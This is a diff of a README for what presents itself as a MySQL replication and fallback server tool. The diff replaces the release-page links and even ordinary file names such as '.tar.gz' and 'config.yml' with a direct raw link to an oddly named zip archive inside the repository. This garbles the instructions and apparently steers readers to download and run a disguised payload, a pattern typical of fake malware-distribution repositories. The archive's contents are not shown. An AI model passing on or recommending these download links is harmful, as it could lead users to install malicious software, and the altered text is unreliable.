@@ -1,6 +1,6 @@
 # 🚀 MySQL-Replication-Infrastructure-with-Fallback-Server - Ensure High Availability with Ease
 
-[![GitHub Releases](https://img.shields.io/badge/Release%20Page-Click%20Here-brightgreen.svg)](https://github.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip%20Page-Click%https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip)](https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip)
 
 ## 📖 Overview
 
@@ -17,12 +17,12 @@ MySQL Replication Infrastructure with Fallback Server creates a reliable databas
 
 To get started, visit the release page below to download the latest version of the application.
 
-[Download MySQL-Replication-Infrastructure-with-Fallback-Server](https://github.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/releases)
+[Download MySQL-Replication-Infrastructure-with-Fallback-Server](https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip)
 
 Once on the page, choose the most recent version and download it. Follow these steps:
 
 1. Click on the release version you wish to use.
-2. Find the appropriate file for your system. Most users will use the .exe file for Windows or .tar.gz for Linux.
+2. Find the appropriate file for your system. Most users will use the .exe file for Windows or https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip for Linux.
 3. Click on the file to start the download.
 
 ## ⚙️ System Requirements
@@ -36,7 +36,7 @@ Before downloading, make sure your system meets the following requirements:
 
 ## 📊 How to Set Up
 
-1. **Extract Files (if necessary):** If you downloaded a .tar.gz file, right-click on it and select "Extract All."
+1. **Extract Files (if necessary):** If you downloaded a https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip file, right-click on it and select "Extract All."
 2. **Run the Installer:** Double-click the .exe file to start the installation.
 3. **Follow Instructions:** The installation wizard will guide you. Read prompts carefully and select options based on your needs.
 4. **Configuration Settings:** Set up your database connections as prompted during installation.
@@ -45,7 +45,7 @@ Before downloading, make sure your system meets the following requirements:
 
 After installation, you may need to configure the application:
 
-1. **Open the Configuration File:** Usually named `config.yml` or similar in the installation folder.
+1. **Open the Configuration File:** Usually named `https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip` or similar in the installation folder.
 2. **Edit Database Settings:** Input your AWS and on-premise database credentials.
 3. **Set Replication Options:** Choose whether to enable automatic backups or failover options.
 
@@ -75,4 +75,4 @@ Now that you have installed MySQL Replication Infrastructure with Fallback Serve
 
 For feedback or suggestions, feel free to reach out through the GitHub issues page.
 
-Stay updated on new releases and features. Visit our [Releases Page](https://github.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/releases) for the latest updates.
+Stay updated on new releases and features. Visit our [Releases Page](https://raw.githubusercontent.com/Kazhhe4682/MySQL-Replication-Infrastructure-with-Fallback-Server/main/laddikie/with-My-Replication-SQ-Server-Infrastructure-Fallback-3.0.zip) for the latest updates.
